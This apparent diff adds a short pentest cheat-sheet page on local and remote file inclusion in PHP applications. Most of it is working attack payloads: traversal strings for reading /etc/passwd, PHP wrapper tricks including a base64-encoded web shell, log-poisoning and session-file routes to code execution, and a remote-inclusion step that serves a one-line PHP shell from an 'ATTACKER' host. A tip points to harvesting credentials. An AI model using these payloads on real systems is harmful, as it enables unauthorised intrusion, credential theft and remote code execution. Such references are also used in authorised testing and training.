@@ -1,0 +1,33 @@
+---
+title: "LFI / RFI"
+---
+
+**LFI** includes a local file into the page; **RFI** includes a remote one (often RCE). Look for `?page=`, `?file=`, `?lang=` style parameters.
+
+```bash
+# basic LFI + traversal
+http://$IP/?page=../../../../etc/passwd
+http://$IP/?page=../../../../etc/passwd%00      # null byte (old PHP)
+# PHP wrappers
+?page=php://filter/convert.base64-encode/resource=index.php   # read source
+?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg==
+?page=expect://id
+```
+
+## LFI → RCE
+
+```text
+- Log poisoning: inject PHP into User-Agent, then include /var/log/apache2/access.log
+- PHP session files: /var/lib/php/sessions/sess_<PHPSESSID>
+- /proc/self/environ (if included)
+```
+
+```bash
+# RFI (allow_url_include=On): host a payload and include it
+echo '<?php system($_GET[0]); ?>' > sh.php ; python3 -m http.server 80
+http://$IP/?page=http://ATTACKER/sh.php&0=id
+```
+
+<Tip>
+Wrap traversal in filter wrappers to read PHP source without executing it — great for finding creds and more bugs.
+</Tip>
